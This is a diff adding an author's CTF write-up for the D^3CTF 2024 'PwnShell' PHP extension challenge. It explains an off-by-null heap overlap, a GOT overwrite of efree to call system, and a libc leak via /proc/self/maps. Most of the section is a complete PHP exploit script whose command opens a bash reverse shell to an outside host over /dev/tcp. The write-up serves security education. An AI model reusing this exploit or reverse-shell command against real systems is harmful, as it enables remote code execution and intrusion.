@@ -375,6 +375,69 @@ add_note(&quot;number0&quot;,&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaal
 
 ?&gt;	
 </code></pre>
+<h1 id="D-3CTF-2024-PwnShell"><a href="#D-3CTF-2024-PwnShell" class="headerlink" title="D^3CTF 2024-PwnShell"></a>D^3CTF 2024-PwnShell</h1><p>I camp up with this pwnable challenge in d^3ctf 2024, to offer an entry-level php pwn challenge. To make it more interesting, I wraped it with a simple file uploading web challenge.</p>
+<p>There is an off-by-null in addHacker function. Trigger the off-by-null to forge a fake fd and create a heap overlap to get a arbitary address write permitive. Then we are able to forge the GOT of efree to call system.</p>
+<p>Btw the libc address leak can be obtained by including the &#x2F;proc&#x2F;self&#x2F;maps or leaking certain pointers in the heap. That&#96;s two typicall way to obtain adderss leak in php pwn.</p>
+<pre><code class="php">&lt;?php  
+$heap_base = 0;  
+$libc_base = 0;  
+$libc = &quot;&quot;;  
+$mbase = &quot;&quot;;  
+  
+function u64($leak)&#123;  
+    $leak = strrev($leak);  
+    $leak = bin2hex($leak);  
+    $leak = hexdec($leak);  
+    return $leak;  
+&#125;  
+  
+function p64($addr)&#123;  
+    $addr = dechex($addr);  
+    $addr = hex2bin($addr);  
+    $addr = strrev($addr);  
+    $addr = str_pad($addr, 8, &quot;\x00&quot;);  
+    return $addr;  
+&#125;  
+  
+function leakaddr($buffer)&#123;  
+    global $libc,$mbase;  
+    $p = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#39;;  
+    $p1 = &#39;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#39;;  
+    preg_match_all($p, $buffer, $libc);  
+    preg_match_all($p1, $buffer, $mbase);  
+    return &quot;&quot;;  
+&#125;  
+  
+function leak()&#123;  
+    global $libc_base, $module_base, $libc, $mbase;  
+  
+    ob_start(&quot;leakaddr&quot;);  
+    include(&quot;/proc/self/maps&quot;);  
+    $buffer = ob_get_contents();  
+    ob_end_flush();  
+    leakaddr($buffer);  
+    $libc_base=hexdec($libc[1][0]);  
+    $module_base=hexdec($mbase[1][0]);  
+&#125;  
+function attack($cmd)&#123;  
+    global $libc_base, $module_base;  
+    $payload = str_pad(p64($module_base + 0x4038).p64(0xff), 0x40, &quot;\x90&quot;);  
+    $gadget = p64($libc_base + 0x4c490);  
+    addHacker(str_repeat(&quot;\x90&quot;, 0x8), str_repeat(&quot;\x90&quot;, 0x30));  
+    addHacker($payload, str_repeat(&quot;\x90&quot;, 0x2f));  
+    addHacker(str_pad($cmd, 0x20, &quot;\x00&quot;), &quot;114514&quot;);  
+    editHacker(0, $gadget);  
+&#125;  
+function main()&#123;  
+    $cmd = &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1&quot;&#39;;  
+    leak();  
+    attack($cmd);  
+    removeHacker(2);  
+&#125;  
+  
+main();  
+?&gt;
+</code></pre>
 </main>
 
 </article>
